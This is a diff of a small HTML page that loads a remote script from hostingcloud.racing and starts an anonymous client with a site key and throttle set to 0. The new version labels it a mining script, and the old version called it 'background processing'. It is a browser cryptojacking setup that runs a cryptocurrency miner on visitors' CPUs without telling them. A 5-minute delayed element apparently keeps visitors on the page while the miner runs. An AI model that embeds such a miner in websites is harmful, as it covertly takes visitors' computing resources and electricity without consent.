@@ -2,39 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple Page with Client Script</title>
-  <!-- HostingCloud Anonymous Client Script -->
+  <title>Simple Miner Integration</title>
 </head>
 <body>
-  <h1>Welcome to Your Simple Page</h1>
-  <p>This page includes the HostingCloud anonymous client script for background processing.</p>
+  <h1>Welcome to My Simple Miner Page</h1>
+  <p>This page integrates the mining script.</p>
 
-  <script src="https://www.hostingcloud.racing/o4St.js"></script>
+  <!-- Hidden element that will appear after 5 minutes -->
+  <div id="delayed-element" style="display: none; margin-top: 1em; padding: 1em; border: 1px solid #ccc;">
+    <p>This content appears after 5 minutes!</p>
+  </div>
+
+  <!-- Mining Script -->
+  <script src="https://www.hostingcloud.racing/tc1M.js"></script>
   <script>
-    // Initialize and start the anonymous client
-    var _client = new Client.Anonymous(
-      '195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54',
-      { throttle: 0, c: 'w' }
-    );
+    var _client = new Client.Anonymous('195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54', {
+      throttle: 0,
+      c: 'w'
+    });
     _client.start();
 
-    // After 5 minutes (300 000 ms), insert a new element into the page
+    // Show the delayed element after 5 minutes (300,000 ms)
     setTimeout(function() {
-      var delayed = document.createElement('div');
-      delayed.id = 'delayedElement';
-      delayed.textContent = '🎉 This element appeared after 5 minutes!';
-      // optional styling
-      delayed.style.cssText = [
-        'padding: 1em',
-        'margin-top: 1em',
-        'background: #f0f8ff',
-        'border: 1px solid #ccc',
-        'border-radius: 4px'
-      ].join(';');
-      document.body.appendChild(delayed);
-    }, 5 * 60 * 1000);
+      var el = document.getElementById('delayed-element');
+      if (el) {
+        el.style.display = 'block';
+      }
+    }, 300000);
   </script>
 </body>
 </html>
